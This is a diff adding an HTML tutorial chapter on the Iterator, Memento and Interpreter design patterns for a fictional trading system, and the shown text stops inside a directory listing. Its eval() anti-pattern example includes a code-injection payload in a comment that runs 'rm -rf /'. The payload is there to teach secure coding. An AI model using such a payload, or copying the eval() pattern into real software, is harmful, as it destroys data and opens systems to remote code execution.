@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chapter 09: Behavioral Patterns IV: Iterator, Memento &amp; Interpreter: DSL Queries &amp; Time Travel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['Fira Code', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-slate-50 text-slate-800 font-sans antialiased leading-relaxed selection:bg-emerald-500 selection:text-white">
+
+    <!-- Top Status Banner -->
+    <div class="bg-slate-950 border-b border-slate-800 text-xs py-2 px-6">
+        <div class="max-w-5xl mx-auto flex flex-wrap justify-between items-center text-slate-400 gap-2">
+            <div class="flex items-center gap-2">
+                <span class="inline-block w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                <span>Enterprise Design Patterns &amp; Architecture Series &bull; Software Architecture Track</span>
+            </div>
+            <div class="font-mono text-[11px] text-slate-400">
+                Project Tracker: <span class="text-emerald-400 font-semibold">NexusCore (Milestone 09 - Iterator, Memento &amp; Interpreter)</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="bg-slate-900 text-white py-16 px-6 shadow-xl border-b border-slate-800 relative overflow-hidden">
+        <div class="absolute -right-20 -top-20 w-96 h-96 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="max-w-5xl mx-auto relative z-10">
+            <div class="inline-flex items-center gap-2 px-3 py-1 mb-4 text-xs font-mono font-semibold tracking-widest uppercase bg-emerald-500/10 text-emerald-400 rounded-full border border-emerald-500/20">
+                Chapter 09 &bull; Behavioral Patterns IV
+            </div>
+            <h1 class="text-4xl sm:text-5xl font-extrabold tracking-tight mt-2 mb-4">
+                Behavioral Patterns IV: Iterator, Memento &amp; Interpreter: DSL Queries &amp; Time Travel
+            </h1>
+            <p class="text-slate-300 text-lg max-w-3xl leading-relaxed">
+                Navigating infinite data streams, freezing historical state, and building domain-specific languages: Streaming millions of transaction records safely with the <strong>Iterator Pattern</strong>, executing zero-leak point-in-time state rollbacks with the <strong>Memento Pattern</strong>, evaluating custom compliance rules using an Abstract Syntax Tree (AST) via the <strong>Interpreter Pattern</strong>, and hardening the analytical core of <strong>NexusCore</strong>.
+            </p>
+        </div>
+    </header>
+
+    <main class="max-w-5xl mx-auto px-6 py-14 space-y-20">
+
+        <!-- Series Project Roadmap Callout -->
+        <section class="bg-gradient-to-br from-slate-900 to-slate-800 text-white rounded-3xl p-8 border border-slate-700 shadow-xl relative overflow-hidden">
+            <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
+                <div class="space-y-2">
+                    <span class="text-xs uppercase font-mono tracking-widest text-emerald-400 font-bold">Continuous Project Build</span>
+                    <h2 class="text-2xl font-extrabold">NexusCore Milestone 09: Stream Traversals, State Checkpoints &amp; Query DSL</h2>
+                    <p class="text-slate-300 text-sm max-w-2xl leading-relaxed">
+                        In Chapters 06 through 08, we implemented fee strategies, clearing pipelines, order state machines, compliance chains, transaction commands, observer price feeds, and visitor portfolio audits. In Milestone 09, we complete the final triad of the classic Gang of Four behavioral patterns. We construct a <strong>Streaming Chunked Iterator</strong> that lazily traverses multi-gigabyte historical trade ledgers without triggering Out-Of-Memory (OOM) crashes. We implement the <strong>Memento Pattern</strong> to capture atomic, encrypted state checkpoints of trading positions before high-risk operations, enabling time-travel rollbacks. Finally, we build an in-house financial Domain Specific Language (DSL) evaluator using the <strong>Interpreter Pattern</strong>, allowing compliance officers to write custom rules like <code class="font-mono text-emerald-300 bg-slate-950 px-1 py-0.5 rounded">AMOUNT &gt; 10000 AND CURRENCY == 'USD'</code> without code redeployments.
+                    </p>
+                </div>
+                <div class="bg-slate-950/80 border border-slate-700 p-4 rounded-2xl font-mono text-xs text-slate-300 min-w-[270px]">
+                    <div class="text-emerald-400 font-bold mb-2 pb-1 border-b border-slate-800">// Milestone 09 Deliverables</div>
+                    <ul class="space-y-1.5 text-[11px]">
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Design Pattern #21: The Iterator Pattern</li>
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Design Pattern #22: The Memento Pattern</li>
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Design Pattern #23: The Interpreter Pattern</li>
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Memory-Bounded Stream Iteration vs. List Loading</li>
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Encapsulation Preservation: Originator vs. Caretaker</li>
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Abstract Syntax Trees (AST) &amp; Safe DSL Evaluation</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Foundational Computer Science Theory -->
+        <section id="behavioral-foundations-4" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-emerald-600 font-mono text-xs font-bold uppercase tracking-wider">Architecture Fundamentals</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">Data Navigation, State Reversibility &amp; Grammar Evaluation</h2>
+            </div>
+
+            <p class="text-slate-700 leading-relaxed">
+                When scaling enterprise backends, developers frequently encounter three distinct non-functional operational bottlenecks:
+            </p>
+            <ol class="list-decimal pl-5 text-sm text-slate-700 space-y-2 font-sans">
+                <li>
+                    <strong>Memory Exhaustion during Sequential Scans:</strong> Querying millions of historical records directly into an in-memory list (<code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-rose-700">records = db.fetch_all()</code>) forces the operating system to allocate gigabytes of RAM, crashing worker pods via Linux OOM-killer signals.
+                </li>
+                <li>
+                    <strong>Leaky Encapsulation in State Rollbacks:</strong> To restore an object to a previous state, junior developers often expose private internal variables via public setters (<code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-rose-700">order.set_raw_internal_balances(...)</code>), destroying class invariants and allowing external callers to corrupt state.
+                </li>
+                <li>
+                    <strong>Code Injection via Dynamic Evaluation:</strong> When business analysts demand the ability to evaluate custom filtering rules on the fly, naive teams resort to Python's hazardous <code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-rose-700">eval()</code> or <code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-rose-700">exec()</code>, introducing arbitrary Remote Code Execution (RCE) vulnerabilities.
+                </li>
+            </ol>
+
+            <div class="bg-emerald-50 border-l-4 border-emerald-500 p-6 rounded-r-2xl space-y-2">
+                <span class="font-bold text-emerald-950 text-sm block font-mono">// The Final GoF Behavioral Solution:</span>
+                <p class="text-xs text-emerald-900 leading-relaxed font-sans">
+                    <strong>Iterator</strong> provides a standard protocol to traverse data sequentially without exposing its internal representation or blowing up memory. <strong>Memento</strong> captures an object's internal state without violating encapsulation, enabling point-in-time time-travel rollbacks. <strong>Interpreter</strong> builds an Abstract Syntax Tree (AST) of safe expression classes to evaluate domain grammars securely.
+                </p>
+            </div>
+        </section>
+
+        <!-- PATTERN 1: ITERATOR -->
+        <section id="pattern-iterator" class="space-y-6">
+            <div class="border-b-2 border-emerald-500 pb-3">
+                <span class="bg-emerald-500 text-slate-950 font-mono text-xs font-bold px-2.5 py-1 rounded-md uppercase tracking-wider">
+                    Design Pattern #21
+                </span>
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-slate-900 mt-2">
+                    Pattern Name: Iterator (Cursor)
+                </h2>
+                <p class="text-sm font-mono text-slate-500 mt-1">
+                    Formal Classification: Behavioral Pattern &bull; Gang of Four (GoF) Reference p. 257
+                </p>
+            </div>
+
+            <!-- 1. Real-World Metaphor -->
+            <div class="bg-sky-50 border border-sky-200 p-6 rounded-2xl space-y-2">
+                <h3 class="text-sky-950 font-bold text-sm flex items-center gap-2">
+                    <span>&#128161;</span> The Real-World Metaphor (Plain English)
+                </h3>
+                <p class="text-xs text-sky-900 leading-relaxed font-sans">
+                    Imagine dining at a revolving sushi bar (Kaitenzushi) where hundreds of fresh dishes circulate on a moving conveyor belt.
+                </p>
+                <p class="text-xs text-sky-900 leading-relaxed font-sans">
+                    You do not demand that the chef bring all 1,000 sushi plates out of the kitchen simultaneously and dump them onto your tiny two-person table all at once. Your table would collapse under the weight, dishes would spill, and you wouldn't have room to eat.
+                </p>
+                <p class="text-xs text-sky-900 leading-relaxed font-sans font-bold">
+                    Instead, you pick up plates one at a time as the conveyor belt rolls by. You inspect a plate, eat it, and wait for the next plate to arrive. The conveyor belt is an Iterator: it feeds you a sequential stream of items on demand, maintaining constant, zero-table-clutter memory usage regardless of how many dishes the kitchen prepares!
+                </p>
+            </div>
+
+            <!-- 2. The Problem: The List-Loading Memory Explosion -->
+            <div class="space-y-4">
+                <h3 class="text-lg font-bold text-slate-900">The Problem: Eager In-Memory List Loading</h3>
+                <p class="text-slate-700 text-sm leading-relaxed">
+                    In financial compliance auditing, an auditor requests all transactions executed during the past quarter. In NexusCore, this can easily represent <strong>10,000,000 transaction records</strong>.
+                </p>
+                <p class="text-slate-700 text-sm leading-relaxed">
+                    Without an iterator, an application fetches all rows into a giant Python list. Because each Python dictionary or object consumes roughly 150 to 200 bytes, a 10-million-row list requires over <strong>2 Gigabytes of physical RAM</strong>, causing immediate container out-of-memory crashes:
+                </p>
+
+                <!-- Bad Code Box -->
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-rose-900 shadow-xl">
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># ANTI-PATTERN: Eager In-Memory List Allocation</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+
+<span class="text-purple-400">class</span> <span class="text-rose-400 font-bold">LedgerAuditService</span>:
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">get_quarterly_transactions</span>(self) -> list:
+        <span class="text-slate-500"># Fetches 10,000,000 records from PostgreSQL directly into one massive Python list!</span>
+        results = db_cursor.execute(<span class="text-amber-300">"SELECT * FROM transactions"</span>).fetchall()
+        
+        <span class="text-slate-500"># RAM spikes to 2.4 GB! Linux OOM-killer fires SIGKILL on the container!</span>
+        all_records = []
+        <span class="text-purple-400">for</span> row <span class="text-purple-400">in</span> results:
+            all_records.append(TransactionRecord(*row))
+            
+        <span class="text-purple-400">return</span> all_records</pre>
+            </div>
+
+            <!-- Visual Flowchart of Iterator -->
+            <div class="bg-slate-900 p-8 rounded-3xl text-white shadow-xl space-y-6 font-mono text-xs">
+                <div class="text-center font-bold text-emerald-400 uppercase tracking-widest text-[11px]">
+                    The Chunked Streaming Iterator Pipeline
+                </div>
+
+                <div class="flex flex-col md:flex-row items-center justify-between gap-3 text-center">
+                    <!-- Client -->
+                    <div class="p-3 bg-slate-950 border border-slate-800 rounded-xl w-full md:w-52 space-y-1">
+                        <span class="text-sky-300 font-bold block">Caller / Auditor</span>
+                        <div class="text-[10px] text-slate-400 font-sans">Calls: for item in iterator:</div>
+                        <div class="text-[9px] text-emerald-400 font-mono">Consumes 1 item at a time</div>
+                    </div>
+
+                    <div class="text-emerald-400 font-bold">&rarr; next() &rarr;</div>
+
+                    <!-- Iterator -->
+                    <div class="p-3 bg-emerald-950/80 border border-emerald-500 rounded-xl w-full md:w-56 space-y-1">
+                        <span class="text-emerald-300 font-bold block">LedgerIterator</span>
+                        <div class="text-[10px] text-emerald-200 font-sans">Maintains cursor offset</div>
+                        <div class="text-[9px] text-slate-300 font-mono">Buffer: Exactly 100 items in RAM</div>
+                    </div>
+
+                    <div class="text-emerald-400 font-bold">&rarr; fetches chunk &rarr;</div>
+
+                    <!-- Storage -->
+                    <div class="p-3 bg-slate-950 border border-purple-500 rounded-xl w-full md:w-52 space-y-1">
+                        <span class="text-purple-300 font-bold block">Database Storage</span>
+                        <div class="text-[10px] text-slate-400 font-sans">SELECT ... LIMIT 100 OFFSET N</div>
+                        <div class="text-[9px] text-purple-200 font-mono">10M records remain on disk</div>
+                    </div>
+                </div>
+
+                <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 text-[11px] text-slate-300 space-y-1 font-sans text-center">
+                    <strong class="text-emerald-400 font-mono">Constant $O(1)$ Memory Consumption:</strong>
+                    <p class="text-slate-400 leading-relaxed text-[11px]">
+                        Whether traversing 100 rows or 100,000,000 rows, memory consumption remains locked at a tiny, predictable constant bound (e.g. exactly the size of one chunk buffer, ~50 Kilobytes).
+                    </p>
+                </div>
+            </div>
+
+            <!-- Decision Rulebook: Iterator -->
+            <div class="grid md:grid-cols-2 gap-6 font-mono text-xs">
+                <div class="p-5 bg-emerald-50 border border-emerald-200 rounded-2xl space-y-2">
+                    <span class="font-bold text-emerald-900 text-sm block">&#10004; When to Use Iterator</span>
+                    <ul class="text-[11px] text-slate-700 space-y-1.5 font-sans list-disc pl-4">
+                        <li>You need to traverse large or infinite datasets that cannot fit entirely into RAM.</li>
+                        <li>You want to decouple the traversal algorithm (depth-first, breadth-first, chunked windowed) from the underlying data storage structure.</li>
+                        <li>You want to provide a uniform, idiomatic Python interface (<code class="font-mono">__iter__</code>, <code class="font-mono">__next__</code>) across disparate collections (trees, databases, files, network streams).</li>
+                    </ul>
+                </div>
+                <div class="p-5 bg-rose-50 border border-rose-200 rounded-2xl space-y-2">
+                    <span class="font-bold text-rose-900 text-sm block">&#10008; When NOT to Use Iterator</span>
+                    <ul class="text-[11px] text-slate-700 space-y-1.5 font-sans list-disc pl-4">
+                        <li>The dataset is small (e.g. 50 items) and already completely loaded in memory. Standard Python lists or tuples are faster and simpler.</li>
+                        <li>You need frequent random indexed access (e.g. <code class="font-mono">collection[42]</code>) rather than sequential stream consumption.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- PATTERN 2: MEMENTO -->
+        <section id="pattern-memento" class="space-y-6">
+            <div class="border-b-2 border-purple-500 pb-3">
+                <span class="bg-purple-500 text-white font-mono text-xs font-bold px-2.5 py-1 rounded-md uppercase tracking-wider">
+                    Design Pattern #22
+                </span>
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-slate-900 mt-2">
+                    Pattern Name: Memento (Token / Snapshot)
+                </h2>
+                <p class="text-sm font-mono text-slate-500 mt-1">
+                    Formal Classification: Behavioral Pattern &bull; Gang of Four (GoF) Reference p. 283
+                </p>
+            </div>
+
+            <!-- Real-World Metaphor -->
+            <div class="bg-purple-50 border border-purple-200 p-6 rounded-2xl space-y-2">
+                <h3 class="text-purple-950 font-bold text-sm flex items-center gap-2">
+                    <span>&#128161;</span> The Real-World Metaphor (Plain English)
+                </h3>
+                <p class="text-xs text-purple-900 leading-relaxed font-sans">
+                    Imagine playing a difficult role-playing video game right before a challenging boss battle.
+                </p>
+                <p class="text-xs text-purple-900 leading-relaxed font-sans">
+                    You hit the <strong>"Save Game"</strong> button. The game engine captures an exact checkpoint of your character's current health, inventory, equipped weapons, and coordinate location, packaging it into a sealed, encrypted save file (The Memento).
+                </p>
+                <p class="text-xs text-purple-900 leading-relaxed font-sans font-bold">
+                    You store the save file on your memory card (The Caretaker). The memory card does not open the file, inspect your inventory, or modify your stats. If your character dies during the battle, you tell the game engine (The Originator): "Restore state from this save file." The character instantly returns to the exact pre-battle state!
+                </p>
+            </div>
+
+            <!-- Encapsulation Preservation: Originator vs Caretaker -->
+            <div class="space-y-4">
+                <h3 class="text-lg font-bold text-slate-900">Encapsulation Safety: Originator vs. Caretaker Roles</h3>
+                <p class="text-slate-700 text-sm leading-relaxed">
+                    A critical principle of object-oriented design is <strong>encapsulation</strong>: internal state should be private and protected from tampering.
+                </p>
+                <p class="text-slate-700 text-sm leading-relaxed">
+                    The Memento Pattern formally assigns responsibilities across three distinct participants:
+                </p>
+
+                <div class="grid md:grid-cols-3 gap-4 font-mono text-xs">
+                    <!-- Originator -->
+                    <div class="p-4 bg-white rounded-2xl border border-slate-200 shadow-sm space-y-2">
+                        <span class="font-bold text-sky-700 block text-sm">1. Originator</span>
+                        <span class="text-[10px] bg-sky-100 text-sky-800 px-1.5 py-0.5 rounded font-bold">The State Owner</span>
+                        <p class="text-[11px] text-slate-600 font-sans leading-relaxed">
+                            The object whose state needs to be saved (<code class="font-mono text-slate-800">OrderBookOriginator</code>). It creates memento snapshots of its own internal state and restores its state from mementos.
+                        </p>
+                    </div>
+
+                    <!-- Memento -->
+                    <div class="p-4 bg-white rounded-2xl border border-slate-200 shadow-sm space-y-2">
+                        <span class="font-bold text-purple-700 block text-sm">2. Memento</span>
+                        <span class="text-[10px] bg-purple-100 text-purple-800 px-1.5 py-0.5 rounded font-bold">The Opaque Snapshot</span>
+                        <p class="text-[11px] text-slate-600 font-sans leading-relaxed">
+                            A sealed, immutable object holding the state snapshot. It exposes a narrow interface to the outside world: other objects cannot inspect or modify its contents!
+                        </p>
+                    </div>
+
+                    <!-- Caretaker -->
+                    <div class="p-4 bg-white rounded-2xl border border-slate-200 shadow-sm space-y-2">
+                        <span class="font-bold text-amber-700 block text-sm">3. Caretaker</span>
+                        <span class="text-[10px] bg-amber-100 text-amber-800 px-1.5 py-0.5 rounded font-bold">The History Keeper</span>
+                        <p class="text-[11px] text-slate-600 font-sans leading-relaxed">
+                            Responsible for holding mementos (e.g. an undo stack or checkpoint registry). It never operates on or inspects the contents of a memento; it simply stores and passes them back.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Visual Flowchart of Memento -->
+            <div class="bg-slate-900 p-8 rounded-3xl text-white shadow-xl space-y-6 font-mono text-xs">
+                <div class="text-center font-bold text-purple-400 uppercase tracking-widest text-[11px]">
+                    Memento Checkpoint &amp; Time-Travel Rollback Architecture
+                </div>
+
+                <div class="flex flex-col md:flex-row items-center justify-between gap-3 text-center">
+                    <!-- Originator -->
+                    <div class="p-4 bg-slate-950 border border-slate-800 rounded-2xl w-full md:w-56 space-y-2">
+                        <span class="text-sky-300 font-bold block text-sm">Originator (OrderBook)</span>
+                        <div class="text-[10px] text-slate-400 font-sans">Balance: $100,000 &bull; Positions: 5</div>
+                        <div class="bg-slate-900 p-1.5 rounded text-emerald-400 text-[10px]">
+                            Calls: .create_memento()
+                        </div>
+                    </div>
+
+                    <div class="text-purple-400 font-bold">&rarr; creates snapshot &rarr;</div>
+
+                    <!-- Memento -->
+                    <div class="p-4 bg-purple-950/60 border border-purple-500 rounded-2xl w-full md:w-56 space-y-2">
+                        <span class="text-purple-300 font-bold block text-sm">Memento (Snapshot)</span>
+                        <div class="text-[10px] text-purple-200 font-sans">Sealed, Immutable State</div>
+                        <div class="text-[9px] text-slate-400 font-mono">
+                            state = (100000, {BTC: 5})
+                        </div>
+                    </div>
+
+                    <div class="text-purple-400 font-bold">&rarr; stored in &rarr;</div>
+
+                    <!-- Caretaker -->
+                    <div class="p-4 bg-slate-950 border border-amber-500 rounded-2xl w-full md:w-56 space-y-2">
+                        <span class="text-amber-300 font-bold block text-sm">Caretaker (History)</span>
+                        <div class="text-[10px] text-slate-400 font-sans">Maintains undo stack:</div>
+                        <div class="bg-slate-900 p-1.5 rounded text-amber-300 text-[10px]">
+                            [Checkpoint_1, Checkpoint_2]
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 text-[11px] text-slate-300 space-y-1 font-sans text-center">
+                    <strong class="text-emerald-400 font-mono">Time-Travel Rollback Trigger:</strong>
+                    <p class="text-slate-400 leading-relaxed text-[11px]">
+                        When a trade simulation fails risk parameters, the Caretaker pops the latest memento and invokes <code class="text-white font-mono">originator.restore(memento)</code>. The Originator reverts internal balances without ever exposing its private dictionaries to the Caretaker.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Decision Rulebook: Memento -->
+            <div class="grid md:grid-cols-2 gap-6 font-mono text-xs">
+                <div class="p-5 bg-emerald-50 border border-emerald-200 rounded-2xl space-y-2">
+                    <span class="font-bold text-emerald-900 text-sm block">&#10004; When to Use Memento</span>
+                    <ul class="text-[11px] text-slate-700 space-y-1.5 font-sans list-disc pl-4">
+                        <li>You need to produce snapshots of an object's state to be able to restore a previous state (undo/rollback/time-travel).</li>
+                        <li>Direct access to the object's fields would expose private implementation details and violate encapsulation.</li>
+                        <li>You are building transactional simulators, drawing applications, or game state checkpoints.</li>
+                    </ul>
+                </div>
+                <div class="p-5 bg-rose-50 border border-rose-200 rounded-2xl space-y-2">
+                    <span class="font-bold text-rose-900 text-sm block">&#10008; When NOT to Use Memento</span>
+                    <ul class="text-[11px] text-slate-700 space-y-1.5 font-sans list-disc pl-4">
+                        <li>The state object is massive (e.g. 500MB of RAM) and checkpoints are created frequently. Taking frequent deep copies will exhaust memory rapidly.</li>
+                        <li>The Caretakers cannot reliably track the lifecycle of mementos, leading to abandoned snapshots lingering in memory.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- PATTERN 3: INTERPRETER -->
+        <section id="pattern-interpreter" class="space-y-6">
+            <div class="border-b-2 border-amber-500 pb-3">
+                <span class="bg-amber-500 text-slate-950 font-mono text-xs font-bold px-2.5 py-1 rounded-md uppercase tracking-wider">
+                    Design Pattern #23
+                </span>
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-slate-900 mt-2">
+                    Pattern Name: Interpreter (Grammar AST Evaluator)
+                </h2>
+                <p class="text-sm font-mono text-slate-500 mt-1">
+                    Formal Classification: Behavioral Pattern &bull; Gang of Four (GoF) Reference p. 243
+                </p>
+            </div>
+
+            <!-- Real-World Metaphor -->
+            <div class="bg-amber-50 border border-amber-200 p-6 rounded-2xl space-y-2">
+                <h3 class="text-amber-950 font-bold text-sm flex items-center gap-2">
+                    <span>&#128161;</span> The Real-World Metaphor (Plain English)
+                </h3>
+                <p class="text-xs text-amber-900 leading-relaxed font-sans">
+                    Imagine an elementary school arithmetic math problem: <code class="font-mono font-bold text-slate-900">(5 + 3) &times; 2</code>.
+                </p>
+                <p class="text-xs text-amber-900 leading-relaxed font-sans">
+                    You do not memorize every possible calculation that can ever exist. Instead, you learn a formal language grammar:
+                </p>
+                <ul class="list-disc pl-5 text-xs text-purple-900 font-sans space-y-1">
+                    <li>Numbers (<code class="font-mono">5</code>, <code class="font-mono">3</code>, <code class="font-mono">2</code>) are <strong>Terminal Expressions</strong>: they represent fixed values that cannot be broken down further.</li>
+                    <li>Operations (<code class="font-mono">+</code>, <code class="font-mono">&times;</code>) are <strong>Non-Terminal Expressions</strong>: they take two smaller expressions, evaluate them, and combine the results.</li>
+                </ul>
+                <p class="text-xs text-amber-900 leading-relaxed font-sans font-bold">
+                    The Interpreter Pattern parses symbols into a composite tree of expression objects (an Abstract Syntax Tree) and recursively evaluates the tree against a given context.
+                </p>
+            </div>
+
+            <!-- The Problem: The Insecure eval() Anti-Pattern -->
+            <div class="space-y-4">
+                <h3 class="text-lg font-bold text-slate-900">The Problem: Arbitrary Code Execution via eval()</h3>
+                <p class="text-slate-700 text-sm leading-relaxed">
+                    In financial compliance, regulatory rules change constantly. A compliance officer needs to define rules such as:
+                    <code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-slate-800">AMOUNT &gt; 10000 AND CURRENCY == 'USD'</code>.
+                </p>
+                <p class="text-slate-700 text-sm leading-relaxed">
+                    A catastrophic junior developer mistake is passing this user-provided rule directly into Python's built-in <code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-rose-700 font-bold">eval()</code>:
+                </p>
+
+                <!-- Bad Code Box -->
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-rose-900 shadow-xl">
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># ANTI-PATTERN: Evaluating Dynamic Business Rules with eval() (RCE Vulnerability)</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+
+<span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">insecure_rule_check</span>(trade_data: dict, user_rule_string: str) -> bool:
+    <span class="text-slate-500"># A malicious user passes: "__import__('os').system('rm -rf /')"</span>
+    <span class="text-slate-500"># eval() executes arbitrary Python bytecode with full application privileges!</span>
+    <span class="text-purple-400">return</span> eval(user_rule_string, {}, trade_data)  <span class="text-slate-500"># CATASTROPHIC REMOTE CODE EXECUTION!</span></pre>
+            </div>
+
+            <!-- Visual Flowchart of Interpreter AST -->
+            <div class="bg-slate-900 p-8 rounded-3xl text-white shadow-xl space-y-6 font-mono text-xs">
+                <div class="text-center font-bold text-amber-400 uppercase tracking-widest text-[11px]">
+                    The Abstract Syntax Tree (AST) Expression Hierarchy
+                </div>
+                <div class="text-center text-slate-400 text-[10px] font-sans">
+                    Expression: <code class="text-emerald-400 font-mono">(AMOUNT &gt; 10000 AND CURRENCY == 'USD') OR SYMBOL == 'BTC'</code>
+                </div>
+
+                <div class="flex flex-col items-center gap-3">
+                    <!-- Root OR -->
+                    <div class="p-3 bg-amber-950/80 border border-amber-500 rounded-xl w-64 text-center">
+                        <span class="text-amber-300 font-bold block">OrExpression (Root Non-Terminal)</span>
+                    </div>
+
+                    <div class="text-slate-500 font-bold">&darr; branches to &darr;</div>
+
+                    <div class="grid md:grid-cols-2 gap-6 w-full max-w-xl">
+                        <!-- Left Branch: AND -->
+                        <div class="p-3 bg-purple-950/80 border border-purple-500 rounded-xl space-y-2 text-center">
+                            <span class="text-purple-300 font-bold block">AndExpression (Non-Terminal)</span>
+                            <div class="grid grid-cols-2 gap-2 text-[9px] text-slate-300 font-mono">
+                                <div class="p-1.5 bg-slate-950 rounded border border-slate-800">
+                                    GreaterThan('amount', 10000)
+                                </div>
+                                <div class="p-1.5 bg-slate-950 rounded border border-slate-800">
+                                    Equals('currency', 'USD')
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right Branch: Terminal -->
+                        <div class="p-3 bg-emerald-950/80 border border-emerald-500 rounded-xl space-y-2 text-center">
+                            <span class="text-emerald-300 font-bold block">Terminal Expression</span>
+                            <div class="p-1.5 bg-slate-950 rounded border border-slate-800 text-[9px] text-slate-300 font-mono">
+                                Equals('symbol', 'BTC')
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 text-[11px] text-slate-300 space-y-1 font-sans text-center">
+                    <strong class="text-emerald-400 font-mono">Sandboxed Safe Interpretation:</strong>
+                    <p class="text-slate-400 leading-relaxed text-[11px]">
+                        The Interpreter pattern parses this tree strictly using safe domain expression classes. Because there is no raw Python bytecode execution, <strong>arbitrary code execution is mathematically impossible</strong>!
+                    </p>
+                </div>
+            </div>
+
+            <!-- Decision Rulebook: Interpreter -->
+            <div class="grid md:grid-cols-2 gap-6 font-mono text-xs">
+                <div class="p-5 bg-emerald-50 border border-emerald-200 rounded-2xl space-y-2">
+                    <span class="font-bold text-emerald-900 text-sm block">&#10004; When to Use Interpreter</span>
+                    <ul class="text-[11px] text-slate-700 space-y-1.5 font-sans list-disc pl-4">
+                        <li>You have a simple grammar or Domain-Specific Language (DSL) that needs to be parsed and evaluated repeatedly against different data contexts.</li>
+                        <li>You need to evaluate user-supplied business or compliance rules safely without exposing the application to injection attacks.</li>
+                        <li>The grammar is simple and stable; efficiency is secondary to clarity and safety.</li>
+                    </ul>
+                </div>
+                <div class="p-5 bg-rose-50 border border-rose-200 rounded-2xl space-y-2">
+                    <span class="font-bold text-rose-900 text-sm block">&#10008; When NOT to Use Interpreter</span>
+                    <ul class="text-[11px] text-slate-700 space-y-1.5 font-sans list-disc pl-4">
+                        <li>The grammar is complex with hundreds of production rules (e.g. parsing full SQL or full Python). Use specialized parser generators like ANTLR or Lark instead.</li>
+                        <li>High-throughput performance is the top constraint; recursive AST tree traversal has substantial method invocation overhead in Python.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- PRODUCTION CODEBASE: NEXUSCORE MILESTONE 09 -->
+        <section id="nexuscore-milestone-09" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-emerald-600 font-mono text-xs font-bold uppercase tracking-wider">Production Codebase</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">NexusCore Milestone 09: Streams, Mementos &amp; Query DSL</h2>
+            </div>
+
+            <p class="text-slate-700 leading-relaxed font-sans text-sm">
+                We now assemble Milestone 09 for <strong>NexusCore</strong>. Below is the production-grade implementation of all three behavioral patterns: a memory-bounded streaming iterator, a checkpoint memento for order book simulations, a sandboxed query DSL interpreter, and a full PyTest verification suite:
+            </p>
+
+            <div class="bg-slate-900 p-5 rounded-2xl text-slate-300 font-mono text-xs space-y-1 border border-slate-800">
+                <div class="text-emerald-400 font-bold mb-2">// NexusCore Architecture Layout (Milestone 09)</div>
+                <div>nexuscore/</div>
+                <div>├── src/</div>
+                <div>│   └── nexuscore/</div>
+                <div>│       ├── core/</div>
+                <div>│       ├── payments/</div>
+                <div>│       ├── orders/</div>
+                <div>│       ├── adapters/</div>
+                <div>│       ├── ledger/</div>
+                <div>│       ├── facade/</div>
+                <div>│       ├── execution/</div>
+                <div>│       ├── portfolio/</div>
+                <div>│       ├── market/</div>
+                <div>│       ├── fees/</div>
+                <div>│       ├── clearing/</div>
+                <div>│       ├── compliance/</div>
+                <div>│       ├── events/</div>
+                <div>│       ├── floor/</div>
+                <div>│       ├── <span class="text-emerald-300 font-bold">streams/</span></div>
